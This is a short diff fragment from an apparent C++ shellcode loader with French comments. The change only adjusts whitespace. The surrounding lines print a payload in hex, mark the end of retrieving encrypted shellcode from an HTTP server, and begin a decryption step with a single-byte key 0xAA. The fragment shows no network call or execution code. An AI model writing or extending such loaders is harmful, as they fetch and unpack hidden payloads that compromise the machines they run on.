@@ -20,12 +20,11 @@ int main() {
         printf("%02X ", payload[i]);
     }
 
-    std::cout << std::endl;
-
-    
+    std::cout << std::endl;   
 
     // Fin de la récupération du shellcode chiffré du serveur http
     
+
     // Etape 3 : Déchiffrement du shellcode 
      // Clé de déchiffrement 
     unsigned char decryptionKey = 0xAA;
